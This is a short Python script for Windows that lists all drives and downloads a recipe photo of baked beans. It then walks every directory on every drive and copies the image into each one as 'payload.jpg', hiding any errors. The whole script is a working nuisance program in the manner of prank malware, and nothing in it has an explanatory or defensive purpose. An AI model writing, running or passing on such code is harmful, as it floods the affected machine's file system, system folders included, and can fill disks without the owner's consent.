import os
import platform
import win32api
import requests
import shutil

def download_file(url: str):
    if platform.system() != "Windows":
        print(f"{platform.system()} not supported.")
        return
    
    downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
    response = requests.get(url, stream=True)
    response.raise_for_status()
    file_name = url.split("/")[-1]

    bean_path = os.path.join(downloads_folder, file_name)
    
    with open(bean_path, "wb") as f:
        shutil.copyfileobj(response.raw, f)

    print(f"Success! File saved to {bean_path}")

if platform.system() == "Windows":
    release = platform.release()
    if release != "":
        print(f"Windows {release} detected.")
    else:
        print("Windows detected, but release can't be determined.")

elif platform.system() == "Linux":
    release = platform.release()
    print(f"Linux {release} not supported.")
    quit()

elif platform.system() == "Darwin":
    release = platform.release()
    print(f"macOS {release} not supported.")
    quit()


get_drives = win32api.GetLogicalDriveStrings()
list_of_drives = get_drives.split("\x00")
drive_list = []

for drive in list_of_drives:
    if drive == "":
        pass
    else:
        drive_list.append(drive)

download_file("https://sweetcsdesigns.com/wp-content/uploads/2021/05/slow-cooker-baked-beans-Recipe-Picture-1.jpg")

url = "https://sweetcsdesigns.com/wp-content/uploads/2021/05/slow-cooker-baked-beans-Recipe-Picture-1.jpg"
downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")
response = requests.get(url, stream=True)
response.raise_for_status()
file_name = url.split("/")[-1]

bean_path = os.path.join(downloads_folder, file_name)

for drive in drive_list:
    if os.path.isdir(drive):
        for root, dirs, files in os.walk(drive):
            file_path = os.path.join(root, "payload.jpg")
            try:
                shutil.copyfile(bean_path, file_path)
                print(f"Success! {file_path} created")
            except:
                pass
    else:
        pass
